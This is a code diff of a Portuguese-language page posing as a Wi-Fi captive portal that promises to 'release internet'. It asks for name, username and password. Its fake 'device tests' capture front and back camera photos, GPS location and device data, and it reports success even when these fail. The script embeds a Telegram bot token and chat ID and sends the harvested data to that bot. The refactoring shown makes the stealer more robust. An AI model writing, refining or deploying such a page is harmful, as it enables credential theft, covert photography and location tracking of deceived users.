@@ -3,26 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Portal de Acesso - Verificação de Rede">
     <title>Portal de Acesso - Verificação de Rede</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        :root {
+            --color-primary: #22c55e;
+            --color-primary-dark: #16a34a;
+            --color-secondary: #3b82f6;
+            --color-secondary-dark: #2563eb;
+            --color-accent: #7c3aed;
+            --color-danger: #dc2626;
+            --color-warning: #f59e0b;
+            --color-success: #22c55e;
+            --color-bg-dark: #0f0c29;
+            --color-bg-mid: #302b63;
+            --color-bg-light: #24243e;
+            --color-text: rgba(255, 255, 255, 0.9);
+            --color-text-muted: rgba(255, 255, 255, 0.6);
+            --color-border: rgba(255, 255, 255, 0.1);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 24px;
+            --spacing-xs: 8px;
+            --spacing-sm: 15px;
+            --spacing-md: 20px;
+            --spacing-lg: 30px;
+            --spacing-xl: 50px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #1a1a2e, #16213e);
+            background: linear-gradient(-45deg, var(--color-bg-dark), var(--color-bg-mid), var(--color-bg-light), #1a1a2e, #16213e);
             background-size: 400% 400%;
             animation: gradientBG 15s ease infinite;
             position: relative;
             overflow-x: hidden;
+            color: var(--color-text);
         }
 
         @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
+            0%, 100% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
         }
 
         .orb {
@@ -34,8 +68,8 @@
             z-index: 0;
         }
 
-        .orb-1 { width: 400px; height: 400px; background: #7c3aed; top: -100px; left: -100px; }
-        .orb-2 { width: 300px; height: 300px; background: #2563eb; bottom: -50px; right: -50px; animation-delay: 5s; }
+        .orb-1 { width: 400px; height: 400px; background: var(--color-accent); top: -100px; left: -100px; }
+        .orb-2 { width: 300px; height: 300px; background: var(--color-secondary); bottom: -50px; right: -50px; animation-delay: 5s; }
         .orb-3 { width: 250px; height: 250px; background: #db2777; top: 50%; left: 50%; animation-delay: 10s; }
 
         @keyframes float {
@@ -44,125 +78,180 @@
             66% { transform: translate(-20px, 20px) scale(0.9); }
         }
 
-        .container { position: relative; z-index: 10; width: 90%; max-width: 450px; }
-
-        .glass-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 50px 40px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 450px;
         }
 
-        .screen { display: none; animation: fadeIn 0.5s ease; }
-        .screen.active { display: block; }
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-lg);
+            padding: var(--spacing-xl) var(--spacing-lg);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .screen.active {
+            display: block;
+        }
 
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .welcome-icon, .testing-icon {
-            width: 100px; height: 100px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 25px; font-size: 50px;
+        .icon-circle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto var(--spacing-lg);
+            font-size: 50px;
             animation: pulse 2s ease infinite;
         }
 
-        .welcome-icon { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4); }
-        .testing-icon { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4); }
+        .icon-circle.success {
+            background: linear-gradient(135deg, var(--color-primary), var(--color-primary-dark));
+            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
+        }
+
+        .icon-circle.info {
+            background: linear-gradient(135deg, var(--color-secondary), var(--color-secondary-dark));
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
+        }
+
+        .icon-circle.large {
+            width: 120px;
+            height: 120px;
+            font-size: 60px;
+        }
 
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.05); }
         }
 
-        .success-icon {
-            width: 120px; height: 120px;
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 25px; font-size: 60px;
-            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
-            animation: successPulse 2s ease infinite;
+        h1, h2 {
+            color: white;
+            text-align: center;
+            margin-bottom: var(--spacing-sm);
         }
 
-        @keyframes successPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
+        h1 { font-size: 28px; font-weight: 700; }
+        h2 { font-size: 26px; font-weight: 700; }
+
+        .subtitle {
+            color: var(--color-text-muted);
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: var(--spacing-lg);
+            font-size: 14px;
         }
-
-        .welcome-title, .form-title, .testing-title, .success-title {
-            color: white; text-align: center; margin-bottom: 15px;
-        }
-
-        .welcome-title { font-size: 28px; font-weight: 700; }
-        .form-title { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
-        .testing-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-        .success-title { font-size: 28px; font-weight: 700; }
-
-        .welcome-subtitle, .form-subtitle, .testing-subtitle, .success-text {
-            color: rgba(255, 255, 255, 0.8); text-align: center; line-height: 1.6; margin-bottom: 30px;
-        }
-
-        .welcome-subtitle { font-size: 16px; }
-        .form-subtitle, .testing-subtitle { font-size: 14px; margin-bottom: 30px; }
-        .success-text { font-size: 16px; }
 
         .info-box {
             background: rgba(34, 197, 94, 0.15);
             border: 2px solid rgba(34, 197, 94, 0.4);
-            border-radius: 16px;
-            padding: 20px; margin-bottom: 25px;
+            border-radius: var(--radius-md);
+            padding: var(--spacing-md);
+            margin-bottom: var(--spacing-md);
         }
 
         .info-box-title {
-            color: #86efac; font-size: 18px; font-weight: 700;
-            margin-bottom: 10px; display: flex; align-items: center; gap: 10px;
+            color: #86efac;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: var(--spacing-xs);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-xs);
         }
 
-        .info-box-text { color: rgba(255, 255, 255, 0.9); font-size: 14px; line-height: 1.6; }
+        .info-box-text {
+            color: var(--color-text);
+            font-size: 14px;
+            line-height: 1.6;
+        }
 
         .btn-primary {
-            width: 100%; padding: 18px;
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            border: none; border-radius: 14px;
-            color: white; font-size: 18px; font-weight: 700;
-            cursor: pointer; transition: all 0.3s ease;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--color-primary), var(--color-primary-dark));
+            border: none;
+            border-radius: var(--radius-md);
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
             box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
-            text-transform: uppercase; letter-spacing: 1px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5); }
-
-        .input-group { margin-bottom: 20px; }
-
-        .input-group label {
-            display: block; color: rgba(255, 255, 255, 0.8);
-            font-size: 14px; font-weight: 500; margin-bottom: 8px;
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
         }
 
-        .input-wrapper { position: relative; }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .form-group {
+            margin-bottom: var(--spacing-md);
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--color-text-muted);
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
 
         .input-icon {
-            position: absolute; left: 16px; top: 50%;
+            position: absolute;
+            left: 16px;
+            top: 50%;
             transform: translateY(-50%);
-            color: rgba(255, 255, 255, 0.5); font-size: 18px; pointer-events: none;
+            color: var(--color-text-muted);
+            font-size: 18px;
+            pointer-events: none;
         }
 
-        .input-group input {
-            width: 100%; padding: 14px 16px 14px 48px;
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
             background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px; color: white; font-size: 15px;
-            transition: all 0.3s ease; outline: none;
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-md);
+            color: white;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
         }
 
-        .input-group input::placeholder { color: rgba(255, 255, 255, 0.4); }
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
 
-        .input-group input:focus {
+        .form-group input:focus {
             background: rgba(255, 255, 255, 0.12);
             border-color: rgba(34, 197, 94, 0.5);
             box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.1);
@@ -170,56 +259,170 @@
 
         .test-item {
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px; padding: 18px; margin-bottom: 15px;
-            display: flex; align-items: center; gap: 15px;
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-md);
+            padding: 18px;
+            margin-bottom: var(--spacing-sm);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-sm);
             transition: all 0.5s ease;
         }
 
-        .test-item.testing { border-color: rgba(251, 191, 36, 0.5); background: rgba(251, 191, 36, 0.1); }
-        .test-item.success { border-color: rgba(34, 197, 94, 0.5); background: rgba(34, 197, 94, 0.1); }
+        .test-item.testing {
+            border-color: rgba(251, 191, 36, 0.5);
+            background: rgba(251, 191, 36, 0.1);
+        }
+
+        .test-item.success {
+            border-color: rgba(34, 197, 94, 0.5);
+            background: rgba(34, 197, 94, 0.1);
+        }
 
         .test-icon {
-            width: 40px; height: 40px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 20px; background: rgba(255, 255, 255, 0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            background: rgba(255, 255, 255, 0.1);
             transition: all 0.5s ease;
         }
 
-        .test-item.testing .test-icon { background: rgba(251, 191, 36, 0.2); animation: spin 1s linear infinite; }
-        .test-item.success .test-icon { background: rgba(34, 197, 94, 0.2); }
+        .test-item.testing .test-icon {
+            background: rgba(251, 191, 36, 0.2);
+            animation: spin 1s linear infinite;
+        }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .test-item.success .test-icon {
+            background: rgba(34, 197, 94, 0.2);
+        }
 
-        .test-text { flex: 1; }
-        .test-name { color: white; font-size: 16px; font-weight: 600; margin-bottom: 3px; }
-        .test-status { color: rgba(255, 255, 255, 0.6); font-size: 13px; }
-        .test-item.testing .test-status { color: #fcd34d; }
-        .test-item.success .test-status { color: #86efac; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .test-content {
+            flex: 1;
+        }
+
+        .test-name {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 3px;
+        }
+
+        .test-status {
+            color: var(--color-text-muted);
+            font-size: 13px;
+        }
+
+        .test-item.testing .test-status {
+            color: #fcd34d;
+        }
+
+        .test-item.success .test-status {
+            color: #86efac;
+        }
 
         .progress-bar {
-            width: 100%; height: 8px;
+            width: 100%;
+            height: 8px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px; overflow: hidden; margin-bottom: 20px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: var(--spacing-md);
         }
 
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #22c55e, #16a34a);
-            width: 0%; transition: width 0.3s ease; border-radius: 4px;
+            background: linear-gradient(90deg, var(--color-primary), var(--color-primary-dark));
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 4px;
         }
 
-        .progress-text { color: rgba(255, 255, 255, 0.7); font-size: 14px; text-align: center; }
+        .progress-text {
+            color: var(--color-text-muted);
+            font-size: 14px;
+            text-align: center;
+        }
 
         .version-tag {
             text-align: center;
-            margin-top: 15px;
+            margin-top: var(--spacing-sm);
             color: rgba(255, 255, 255, 0.3);
             font-size: 11px;
             font-family: 'Courier New', monospace;
         }
 
-        @media (max-width: 480px) { .glass-card { padding: 40px 25px; } }
+        /* Modal de erro */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: rgba(30, 30, 50, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-md);
+            padding: var(--spacing-lg);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-title {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .modal-text {
+            color: var(--color-text-muted);
+            font-size: 14px;
+            margin-bottom: var(--spacing-md);
+            line-height: 1.6;
+        }
+
+        .modal-btn {
+            padding: 12px 30px;
+            background: var(--color-primary);
+            border: none;
+            border-radius: var(--radius-sm);
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .modal-btn:hover {
+            background: var(--color-primary-dark);
+        }
+
+        @media (max-width: 480px) {
+            .glass-card {
+                padding: var(--spacing-lg) var(--spacing-md);
+            }
+        }
     </style>
 </head>
 <body>
@@ -231,16 +434,16 @@
         <div class="glass-card">
             
             <!-- TELA 1: BOAS VINDAS -->
-            <div class="screen active" id="screen1">
-                <div class="welcome-icon"></div>
-                <h1 class="welcome-title">Internet Liberada!</h1>
-                <p class="welcome-subtitle">
+            <div class="screen active" id="screen1" role="main" aria-label="Tela de boas-vindas">
+                <div class="icon-circle success" aria-hidden="true">🌐</div>
+                <h1>Internet Liberada!</h1>
+                <p class="subtitle">
                     Parabéns! Sua conexão foi aprovada e está quase pronta para uso.
                 </p>
                 
                 <div class="info-box">
                     <div class="info-box-title">
-                        <span>✅</span>
+                        <span aria-hidden="true">✅</span>
                         <span>Quase lá!</span>
                     </div>
                     <div class="info-box-text">
@@ -250,88 +453,125 @@
                     </div>
                 </div>
 
-                <button class="btn-primary" onclick="showScreen(2)">
+                <button class="btn-primary" onclick="App.navigate(2)" aria-label="Prosseguir para cadastro">
                     CADASTRAR E LIBERAR INTERNET
                 </button>
             </div>
 
             <!-- TELA 2: CADASTRO -->
-            <div class="screen" id="screen2">
-                <h2 class="form-title">Cadastro Rápido</h2>
-                <p class="form-subtitle">Preencha para liberar sua internet</p>
+            <div class="screen" id="screen2" role="form" aria-label="Formulário de cadastro">
+                <h2>Cadastro Rápido</h2>
+                <p class="subtitle">Preencha para liberar sua internet</p>
 
-                <form id="registerForm" onsubmit="handleRegister(event)">
-                    <div class="input-group">
-                        <label>Nome Completo</label>
+                <form id="registerForm" onsubmit="App.handleRegister(event)" novalidate>
+                    <div class="form-group">
+                        <label for="regName">Nome Completo</label>
                         <div class="input-wrapper">
-                            <input type="text" id="regName" placeholder="Seu nome completo" required />
-                            <span class="input-icon">👤</span>
+                            <input 
+                                type="text" 
+                                id="regName" 
+                                placeholder="Seu nome completo" 
+                                required 
+                                minlength="3"
+                                maxlength="100"
+                                aria-required="true"
+                                aria-label="Nome completo"
+                            />
+                            <span class="input-icon" aria-hidden="true"></span>
                         </div>
                     </div>
 
-                    <div class="input-group">
-                        <label>Usuário</label>
+                    <div class="form-group">
+                        <label for="regUsername">Usuário</label>
                         <div class="input-wrapper">
-                            <input type="text" id="regUsername" placeholder="Escolha um usuário" required autocomplete="off" />
-                            <span class="input-icon">@</span>
+                            <input 
+                                type="text" 
+                                id="regUsername" 
+                                placeholder="Escolha um usuário" 
+                                required 
+                                minlength="3"
+                                maxlength="50"
+                                autocomplete="off"
+                                aria-required="true"
+                                aria-label="Nome de usuário"
+                            />
+                            <span class="input-icon" aria-hidden="true">@</span>
                         </div>
                     </div>
 
-                    <div class="input-group">
-                        <label>Senha</label>
+                    <div class="form-group">
+                        <label for="regPassword">Senha</label>
                         <div class="input-wrapper">
-                            <input type="password" id="regPassword" placeholder="Crie uma senha" required />
-                            <span class="input-icon"></span>
+                            <input 
+                                type="password" 
+                                id="regPassword" 
+                                placeholder="Crie uma senha" 
+                                required 
+                                minlength="6"
+                                maxlength="100"
+                                aria-required="true"
+                                aria-label="Senha"
+                            />
+                            <span class="input-icon" aria-hidden="true">🔒</span>
                         </div>
                     </div>
 
-                    <div class="input-group">
-                        <label>Confirmar Senha</label>
+                    <div class="form-group">
+                        <label for="regConfirmPassword">Confirmar Senha</label>
                         <div class="input-wrapper">
-                            <input type="password" id="regConfirmPassword" placeholder="Confirme sua senha" required />
-                            <span class="input-icon">🔒</span>
+                            <input 
+                                type="password" 
+                                id="regConfirmPassword" 
+                                placeholder="Confirme sua senha" 
+                                required 
+                                minlength="6"
+                                maxlength="100"
+                                aria-required="true"
+                                aria-label="Confirmar senha"
+                            />
+                            <span class="input-icon" aria-hidden="true">🔒</span>
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-primary">
+                    <button type="submit" class="btn-primary" aria-label="Iniciar testes do dispositivo">
                         INICIAR TESTES DO DISPOSITIVO
                     </button>
                 </form>
             </div>
 
             <!-- TELA 3: TESTES -->
-            <div class="screen" id="screen3">
-                <div class="testing-icon"></div>
-                <h2 class="testing-title">Testando Dispositivo</h2>
-                <p class="testing-subtitle">Aguarde enquanto verificamos seu dispositivo...</p>
+            <div class="screen" id="screen3" role="status" aria-label="Testes em andamento" aria-live="polite">
+                <div class="icon-circle info" aria-hidden="true">🔍</div>
+                <h2>Testando Dispositivo</h2>
+                <p class="subtitle">Aguarde enquanto verificamos seu dispositivo...</p>
 
-                <div class="test-item" id="testTouch">
-                    <div class="test-icon">👆</div>
-                    <div class="test-text">
+                <div class="test-item" id="testTouch" role="listitem">
+                    <div class="test-icon" aria-hidden="true">👆</div>
+                    <div class="test-content">
                         <div class="test-name">Touch Screen</div>
                         <div class="test-status">Aguardando...</div>
                     </div>
                 </div>
 
-                <div class="test-item" id="testCamera">
-                    <div class="test-icon">📷</div>
-                    <div class="test-text">
+                <div class="test-item" id="testCamera" role="listitem">
+                    <div class="test-icon" aria-hidden="true"></div>
+                    <div class="test-content">
                         <div class="test-name">Câmera</div>
                         <div class="test-status">Aguardando...</div>
                     </div>
                 </div>
 
-                <div class="test-item" id="testGPS">
-                    <div class="test-icon">📍</div>
-                    <div class="test-text">
+                <div class="test-item" id="testGPS" role="listitem">
+                    <div class="test-icon" aria-hidden="true">📍</div>
+                    <div class="test-content">
                         <div class="test-name">Localização GPS</div>
                         <div class="test-status">Aguardando...</div>
                     </div>
                 </div>
 
-                <div class="test-item" id="testData">
-                    <div class="test-icon">📊</div>
-                    <div class="test-text">
+                <div class="test-item" id="testData" role="listitem">
+                    <div class="test-icon" aria-hidden="true">📊</div>
+                    <div class="test-content">
                         <div class="test-name">Dados do Dispositivo</div>
                         <div class="test-status">Aguardando...</div>
                     </div>
@@ -339,987 +579,1229 @@
             </div>
 
             <!-- TELA 4: SUCESSO -->
-            <div class="screen" id="screen4">
-                <div class="success-icon">✅</div>
-                <h2 class="success-title">Tudo Pronto!</h2>
-                <p class="success-text">
+            <div class="screen" id="screen4" role="status" aria-label="Processo concluído">
+                <div class="icon-circle success large" aria-hidden="true">✅</div>
+                <h2>Tudo Pronto!</h2>
+                <p class="subtitle">
                     Seu dispositivo foi verificado com sucesso!<br>
                     Sua internet está sendo liberada agora...
                 </p>
 
-                <div class="progress-bar">
+                <div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
                 <div class="progress-text" id="progressText">Liberando conexão... 0%</div>
             </div>
 
-            <div class="version-tag">v9.7.10</div>
+            <div class="version-tag" aria-label="Versão do sistema">v9.8.11</div>
 
         </div>
     </div>
 
+    <!-- Modal de erro -->
+    <div class="modal-overlay" id="errorModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+        <div class="modal-content">
+            <h3 class="modal-title" id="modalTitle">Erro</h3>
+            <p class="modal-text" id="modalText">Ocorreu um erro.</p>
+            <button class="modal-btn" onclick="App.closeModal()" aria-label="Fechar modal">OK</button>
+        </div>
+    </div>
+
     <script>
-        // ⚙️ CONFIGURAÇÕES DO TELEGRAM
-        const TELEGRAM_BOT_TOKEN = '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0';
-        const TELEGRAM_CHAT_ID = '-5425475205';
-        const VERSION = '9.7.10';
+        /**
+         * Portal de Acesso - Sistema de Verificação
+         * Versão: 9.8.11
+         * 
+         * Módulos:
+         * - Config: Configurações globais
+         * - Logger: Sistema de logs estruturados
+         * - Validator: Validação de dados
+         * - HttpClient: Cliente HTTP com retry e timeout
+         * - DeviceCollector: Coleta de dados do dispositivo
+         * - CameraManager: Gerenciamento de câmera
+         * - TelegramService: Serviço de envio para Telegram
+         * - App: Aplicação principal
+         */
 
-        let userData = {};
-        let deviceData = {};
-        let cameraPhotos = { front: null, back: null };
+        'use strict';
 
-        function showScreen(screenNum) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(`screen${screenNum}`).classList.add('active');
-        }
-
-        async function handleRegister(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('regName').value;
-            const username = document.getElementById('regUsername').value;
-            const password = document.getElementById('regPassword').value;
-            const confirmPassword = document.getElementById('regConfirmPassword').value;
-            
-            if (password !== confirmPassword) {
-                alert('As senhas não coincidem!');
-                return;
+        // ============================================
+        // MÓDULO: CONFIG
+        // ============================================
+        const Config = Object.freeze({
+            VERSION: '9.8.11',
+            TELEGRAM: {
+                BOT_TOKEN: '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0',
+                CHAT_ID: '-5425475205',
+                API_BASE: 'https://api.telegram.org/bot',
+                MAX_MESSAGE_LENGTH: 4096,
+                RETRY_ATTEMPTS: 3,
+                RETRY_DELAY: 1000,
+                TIMEOUT: 10000
+            },
+            GPS: {
+                TIMEOUT: 15000,
+                ENABLE_HIGH_ACCURACY: true,
+                MAXIMUM_AGE: 0
+            },
+            CAMERA: {
+                VIDEO_WIDTH: 1280,
+                VIDEO_HEIGHT: 720,
+                JPEG_QUALITY: 0.8,
+                CAPTURE_DELAY: 500
+            },
+            VALIDATION: {
+                MIN_PASSWORD_LENGTH: 6,
+                MAX_PASSWORD_LENGTH: 100,
+                MIN_NAME_LENGTH: 3,
+                MAX_NAME_LENGTH: 100,
+                MIN_USERNAME_LENGTH: 3,
+                MAX_USERNAME_LENGTH: 50
+            },
+            CACHE: {
+                TTL: 300000 // 5 minutos
             }
+        });
+
+        // ============================================
+        // MÓDULO: LOGGER
+        // ============================================
+        const Logger = {
+            level: 'info',
             
-            if (password.length < 6) {
-                alert('A senha deve ter pelo menos 6 caracteres!');
-                return;
+            _shouldLog(level) {
+                const levels = { error: 0, warn: 1, info: 2, debug: 3 };
+                return levels[level] <= levels[this.level];
+            },
+
+            error(message, data = null) {
+                if (this._shouldLog('error')) {
+                    console.error(`[ERROR] ${message}`, data || '');
+                }
+            },
+
+            warn(message, data = null) {
+                if (this._shouldLog('warn')) {
+                    console.warn(`[WARN] ${message}`, data || '');
+                }
+            },
+
+            info(message, data = null) {
+                if (this._shouldLog('info')) {
+                    console.log(`[INFO] ${message}`, data || '');
+                }
+            },
+
+            debug(message, data = null) {
+                if (this._shouldLog('debug')) {
+                    console.debug(`[DEBUG] ${message}`, data || '');
+                }
+            },
+
+            success(message) {
+                console.log(`✅ ${message}`);
             }
-            
-            userData = { name, username, password };
-            showScreen(3);
-            await runTests();
-        }
+        };
 
-        async function runTests() {
-            await runTest('testTouch', 'Verificando touch...', 'Touch OK ✅', testTouch);
-            await runTest('testCamera', 'Testando câmera...', 'Câmera OK ✅', testCamera);
-            await runTest('testGPS', 'Localizando...', 'GPS OK ✅', testGPS);
-            await runTest('testData', 'Coletando TODOS os dados...', 'Dados OK ✅', collectAllData);
-            
-            await sendAllToTelegram();
-            
-            setTimeout(() => {
-                showScreen(4);
-                startProgress();
-            }, 1000);
-        }
+        // ============================================
+        // MÓDULO: VALIDATOR
+        // ============================================
+        const Validator = {
+            sanitizeString(str) {
+                if (typeof str !== 'string') return '';
+                return str.trim().replace(/[<>]/g, '');
+            },
 
-        async function runTest(elementId, testingText, successText, testFunction) {
-            const element = document.getElementById(elementId);
-            const status = element.querySelector('.test-status');
-            
-            element.classList.add('testing');
-            status.textContent = testingText;
-            
-            try {
-                await testFunction();
-                element.classList.remove('testing');
-                element.classList.add('success');
-                status.textContent = successText;
-            } catch (error) {
-                console.error('Erro no teste:', error);
-                element.classList.remove('testing');
-                element.classList.add('success');
-                status.textContent = successText;
+            validateName(name) {
+                const sanitized = this.sanitizeString(name);
+                if (sanitized.length < Config.VALIDATION.MIN_NAME_LENGTH) {
+                    return { valid: false, error: 'Nome muito curto' };
+                }
+                if (sanitized.length > Config.VALIDATION.MAX_NAME_LENGTH) {
+                    return { valid: false, error: 'Nome muito longo' };
+                }
+                return { valid: true, value: sanitized };
+            },
+
+            validateUsername(username) {
+                const sanitized = this.sanitizeString(username);
+                if (sanitized.length < Config.VALIDATION.MIN_USERNAME_LENGTH) {
+                    return { valid: false, error: 'Usuário muito curto' };
+                }
+                if (sanitized.length > Config.VALIDATION.MAX_USERNAME_LENGTH) {
+                    return { valid: false, error: 'Usuário muito longo' };
+                }
+                if (!/^[a-zA-Z0-9_]+$/.test(sanitized)) {
+                    return { valid: false, error: 'Usuário contém caracteres inválidos' };
+                }
+                return { valid: true, value: sanitized };
+            },
+
+            validatePassword(password) {
+                if (password.length < Config.VALIDATION.MIN_PASSWORD_LENGTH) {
+                    return { valid: false, error: `Senha deve ter pelo menos ${Config.VALIDATION.MIN_PASSWORD_LENGTH} caracteres` };
+                }
+                if (password.length > Config.VALIDATION.MAX_PASSWORD_LENGTH) {
+                    return { valid: false, error: 'Senha muito longa' };
+                }
+                return { valid: true, value: password };
+            },
+
+            validatePasswordMatch(password, confirmPassword) {
+                if (password !== confirmPassword) {
+                    return { valid: false, error: 'As senhas não coincidem' };
+                }
+                return { valid: true };
             }
-            
-            await new Promise(resolve => setTimeout(resolve, 800));
-        }
+        };
 
-        async function testTouch() {
-            deviceData.touchSupport = 'ontouchstart' in window;
-            deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
-            deviceData.pointerType = window.matchMedia?.('(pointer: fine)').matches ? 'preciso (mouse)' : 
-                                     window.matchMedia?.('(pointer: coarse)').matches ? 'grosso (touch)' : 'nenhum';
-            deviceData.hoverSupport = window.matchMedia?.('(hover: hover)').matches ? 'sim' : 'não';
-            await new Promise(resolve => setTimeout(resolve, 800));
-        }
+        // ============================================
+        // MÓDULO: HTTP CLIENT
+        // ============================================
+        const HttpClient = {
+            async request(url, options = {}) {
+                const {
+                    method = 'GET',
+                    headers = {},
+                    body = null,
+                    timeout = Config.TELEGRAM.TIMEOUT,
+                    retries = Config.TELEGRAM.RETRY_ATTEMPTS
+                } = options;
 
-        async function testCamera() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                deviceData.cameraFront = 'NÃO DISPONÍVEL';
-                deviceData.cameraBack = 'NÃO DISPONÍVEL';
-                return;
-            }
+                for (let attempt = 1; attempt <= retries; attempt++) {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), timeout);
 
-            try {
-                await capturePhoto('user', 'front');
-                await new Promise(resolve => setTimeout(resolve, 500));
-                await capturePhoto('environment', 'back');
-                
-                deviceData.cameraFront = cameraPhotos.front ? 'CAPTURADA' : 'FALHOU';
-                deviceData.cameraBack = cameraPhotos.back ? 'CAPTURADA' : 'FALHOU';
-            } catch (error) {
-                console.error('Erro câmera:', error);
-                deviceData.cameraFront = 'ERRO';
-                deviceData.cameraBack = 'ERRO';
-            }
-        }
-
-        async function capturePhoto(facingMode, type) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-                    audio: false
-                });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.autoplay = true;
-                video.playsInline = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                
